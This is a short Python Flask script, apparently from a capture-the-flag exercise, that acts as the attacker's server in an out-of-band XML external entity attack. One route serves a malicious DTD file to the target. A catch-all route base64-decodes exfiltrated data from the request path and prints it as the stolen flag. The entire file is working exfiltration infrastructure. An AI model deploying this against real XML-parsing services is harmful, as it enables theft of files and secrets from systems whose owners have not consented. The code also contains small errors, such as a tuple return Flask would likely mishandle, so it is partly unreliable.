from flask import send_file, send_from_directory, safe_join, abort
from flask import Flask
from base64 import b64decode
app = Flask(__name__)

@app.route('/exp.xml')
def hello_world():
    print("Fecthing exploit")
    return send_file("dtd.xml")

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    flag = b64decode(path.encode("ascii")).decode()
    print("[+] Flag: "+flag)
    return "[+] Flag:", flag

if __name__ == '__main__':
      app.run(host='0.0.0.0', port=21)
